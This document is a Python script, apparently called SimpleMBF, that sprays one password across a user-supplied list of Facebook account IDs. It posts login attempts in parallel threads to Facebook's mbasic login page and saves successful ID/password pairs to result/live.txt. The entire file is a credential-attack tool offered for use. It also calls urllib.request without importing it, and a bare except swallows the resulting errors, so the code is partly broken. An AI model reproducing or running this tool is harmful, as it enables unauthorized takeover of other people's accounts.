from threading import Thread
from requests import post
import os, urllib.parse, sys
os.system('clear')

lie=[]
chr=[]
thr=[]
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
#banner
print("""%s
   _____            __    __  ______  ____
  / __(_)_ _  ___  / /__ /  |/  / _ )/ __/
 _\ \/ /  ' \/ _ \/ / -_) /|_/ / _  / _/  
/___/_/_/_/_/ .__/_/\__/_/  /_/____/_/    
           /_/ %sAuthor:KANG-NEWBIE%s
"""%(c,g,w))
def main(args,kwds):
	try:
		url='https://mbasic.facebook.com/login.php'
		dt={'email':args,'pass':kwds,'login':'submit'}
		#req=post('https://mbasic.facebook.com/login.php',data=dt,headers={'User-Agent':'Mozilla/5.0 (Linux; Android 5.1.1; Andromax C46B2H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.156 Mobile Safari/537.36'}).url
		data = urllib.parse.urlencode(dt)
		data = data.encode('utf-8')
		req = urllib.request.Request(url, data)
		resp = urllib.request.urlopen(req)
		respData = resp.read()
		if 'save-device' in str(respData) or 'm_sess' in str(respData):
			true='yeah'
			live="[live] %s => %s"%(args,kwds)
			lie.append(true)
			try:
				os.mkdir('result')
			except FileExistsError:
				pass
			tulis="{}\n".format(live)
			open('result/live.txt','a').write(tulis)
			print("%s[%slive%s]%s %s -> %s"%(c,g,c,w,args,kwds))
		else:
			print("%s[%snot%s]%s %s"%(c,r,c,w,args))
	except: pass

try:
	file=open(input("[in] Id List Target: ")).read().splitlines()
	pas=input("[in] Password to Crack: ")
	print()
except KeyboardInterrupt:
	exit("%s\n[!] Key interrupt: Exiting."%(r))
except EOFError:
	exit("%s\n[!] Key interrupt: Exiting."%(r))
except FileNotFoundError:
	exit("%s\n[!] File not found: Exiting."%(r))

try:
	for x in file:
	    chr.append(x)

	for x in chr:
	    t=Thread(target=main,args=(x,pas,))
	    thr.append(t)

	for t in thr:
	    t.start()
	for t in thr:
	    t.join()
except KeyboardInterrupt:
	exit()
except EOFError:
	exit()

if 'yeah' in str(lie):
	print("\nLive Results saved: result/live.txt")

